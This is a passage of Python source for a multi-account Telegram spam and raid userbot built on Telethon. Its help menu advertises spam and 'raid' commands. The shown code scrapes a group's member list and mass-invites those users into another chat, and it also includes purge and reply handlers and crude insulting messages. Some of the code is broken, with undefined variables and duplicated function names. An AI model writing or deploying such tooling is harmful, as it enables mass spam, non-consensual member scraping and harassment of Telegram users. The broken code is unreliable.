       text = "𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀\n\n𝙐𝙩𝙞𝙡𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙:\n.alive\n.ping\n.purge\n.inviteall\n.reply\n.restart\n\n𝙐𝙨𝙚𝙧𝙗𝙤𝙩 𝘾𝙤𝙢𝙢𝙖𝙣𝙙:\n.bio\n.join\n.pjoin\n.leave\n\n𝙎𝙥𝙖𝙢 𝘾𝙤𝙢𝙢𝙖𝙣𝙙:\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n\n\nFor more help regarding usage of plugins type plugins name"
       await e.reply(text, parse_mode=None, link_preview=None )

        

 # --------------------------------------------------------------------------------------------------------------------------------



# --------------------------------------------------------------------------------------------------------------------------------

# -  Codes By @GodLucifer On Telegram 

# --------------------------------------------------------------------------------------------------------------------------------


from telethon.errors import (
    ChannelInvalidError,
    ChannelPrivateError,
    ChannelPublicGroupNaError,
)
from telethon.tl import functions
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.tl.functions.messages import GetFullChatRequest

async def get_chatinfo(event):
    chat = event.text[10:]
    chat_info = None
    if chat:
        try:
            chat = int(chat)
        except ValueError:
            pass
    if not chat:
        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            if replied_msg.fwd_from and replied_msg.fwd_from.channel_id is not None:
                chat = replied_msg.fwd_from.channel_id
        else:
            chat = event.chat_id
    try:
        chat_info = await event.client(GetFullChatRequest(chat))
    except:
        try:
            chat_info = await event.client(GetFullChannelRequest(chat))
        except ChannelInvalidError:
            await event.reply("`Invalid channel/group`")
            return None
        except ChannelPrivateError:
            await event.reply(
                "`This is a private channel/group or I am banned from there`"
            )
            return None
        except ChannelPublicGroupNaError:
            await event.reply("`Channel or supergroup doesn't exist`")
            return None
        except (TypeError, ValueError):
            await event.reply("`Invalid channel/group`")
            return None
    return chat_info


def user_full_name(user):
    names = [user.first_name, user.last_name]
    names = [i for i in list(names) if i]
    full_name = " ".join(names)
    return full_name

@luc.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
async def get_users(event):
  sender = await event.get_sender()
  me = await event.client.get_me()
  if event.sender_id in SMEX_USERS:
    he_ll = event.text[10:]
    hell = await event.reply("`Processing.....`")
    if not he_ll:
        return await hell.edit("Give Channel")
    if he_ll == "@TheDarkChats":
        return await hell.edit("Restricted to invite users from there.")
    elif he_ll == "@DopeGladiators":
        return await hell.edit("Restricted to invite users from there.")
    elif he_ll == "@DarkkTech":
        return await hell.edit("Restricted to invite users from there.")
    kraken = await get_chatinfo(event)
    chat = await event.get_chat()
    if event.is_private:
        return await hell.edit("`Sorry, Cant add users here`")
    s = 0
    f = 0
    error = "None"

    await hell.edit("**INVITING USERS !!**")
    async for user in event.client.iter_participants(kraken.full_chat.id):
        try:
            if error.startswith("Too"):
                return await hell.edit(
                    f"**INVITING FINISHED !**\n\n**Error :** \n`{error}`\n\n**Invited :**  `{s}` users. \n**Failed to Invite :** `{f}` users."
                )
            await event.client(
                functions.channels.InviteToChannelRequest(channel=chat, users=[user.id])
            )
            s = s + 1
            await hell.edit(
                f"**INVITING USERS.. **\n\n**Invited :**  `{s}` users \n**Failed to Invite :**  `{f}` users.\n\n**×Error :**  `{error}`"
            )
        except Exception as e:
            error = str(e)
            f = f + 1
    return await hell.edit(
        f"**INVITING FINISHED** \n\n**Invited :**  `{s}` users \n**Failed :**  `{f}` users."
    )
  else:
   return await event.reply("`Bluc5 Chapal Phek Ke Maruga Agar Members Scrape Kiye To Lawde...`")

#################
import os
GodLucifer = os.environ.get("ALIVE_PIC",None)
if not GodLucifer:
 GodLucifer="https://telegra.ph//file/e2a6695c2a4c7a94ceb52.jpg"
#################


@luc.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
async def alive(event):
  if event.sender_id in SMEX_USERS:
    sed = await event.client.get_me()
    kk = sed.first_name
    k = sed.id
    s = f"[{kk}](tg://user?id={k})"
    tf = f"""
**{s} Is Oɴ Fɪʀᴇ 🔥
Hᴇʏᴀ D:) I Aᴍ Aʟɪᴠᴇ
Aʟʟ Sʏsᴛᴇᴍs Aʀᴇ Wᴏʀᴋɪɴɢ Pʀᴏᴘᴇʟʏ!!
Mᴀsᴛᴇʀ:-** **[『 𝙶𝚘𝚍 𝙻𝚞𝚌𝚒𝚏𝚎𝚛 』](t.me/GodLucifer)**
**Dᴏ** `.help` **Tᴏ Cʜᴇᴄᴋ Mʏ Cᴏᴍᴍᴀɴᴅs!!**
"""
    await event.client.send_file(event.chat_id,amaan786,caption=tf, force_document=False, link_preview=False)
import time
from time import sleep

@luc.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
async def purge(event):
 if event.sender_id in SMEX_USERS:
   start = time.perf_counter()
   reply_msg = await event.get_reply_message()
   if not reply_msg:
       await event.reply(
            "`Reply to a message to select where to start purging from.`")
       return
   messages = []
   message_id = reply_msg.id
   delete_to = event.message.id
   messages.append(event.reply_to_msg_id)
   for msg_id in range(message_id, delete_to + 1):
        messages.append(msg_id)
        if len(messages) == 100:
            await event.client.delete_messages(event.chat_id, messages)
            messages = []
   await event.client.delete_messages(event.chat_id, messages)
   time_ = time.perf_counter() - start
   text = f"🗑 `Purged Messages` `in {time_:0.2f} seconds`"
   #hdgs = await event.respond(text, parse_mode='markdown')
   await event.delete()
   sleep(1)
   #await hdgs.delete()
   await event.delete()


#####################


##################

@luc.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
async def purge(event):
 if event.sender_id in SMEX_USERS:
  sed = event.text[6:]
  k = await event.get_reply_message()
  if not k:
     await event.reply("Reply Any User")
     return
  await k.reply(sed)


async def Start_Kardo_Bot():
  await event.client.send_message("DarkkTech", "**TOR MAAKIE CHUT**")





################################

        
text = """
"""

print(text)
print("")
print("SMEX! Started Sucessfully.")
if len(sys.argv) not in (1, 3, 4):
    try:
        luc.disconnect()
    except Exception as e:
        pass
    try:
        luc2.disconnect()
    except Exception as e:
        pass
    try:
        luc3.disconnect()
    except Exception as e:
        pass
    try:
        luc4.disconnect()
    except Exception as e:
        pass
    try:
        luc5.disconnect()
    except Exception as e:
        pass
    try:
        luc6.disconnect()
    except Exception as e:
        pass
    try:
        luc7.disconnect()
    except Exception as e:
        pass
    try:
        luc8.disconnect()
    except Exception as e:
        pass
    try:
        luc9.disconnect()
    except Exception as e:
        pass
    try:
        luc10.disconnect()
    except Exception as e:
        pass
else:
    try:
        luc.run_until_disconnected()
    except Exception as e:
        pass
    try:
        luc2.run_until_disconnected()
    except Exception as e:
        pass
    try:
        luc3.run_until_disconnected()
    except Exception as e:
        pass
    try:
        luc4.run_until_disconnected()
    except Exception as e:
        pass
    try:
        luc5.run_until_disconnected()
    except Exception as e:
        pass
    try:
        luc6.run_until_disconnected()
    except Exception as e:
        pass
    try:
        luc7.run_until_disconnected()
    except Exception as e:
        pass
    try:
        luc8.run_until_disconnected()
    except Exception as e:
        pass
    try:
        luc9.run_until_disconnected()
    except Exception as e:
        pass
    try:
        luc10.run_until_disconnected()
    except Exception as e:
        pass
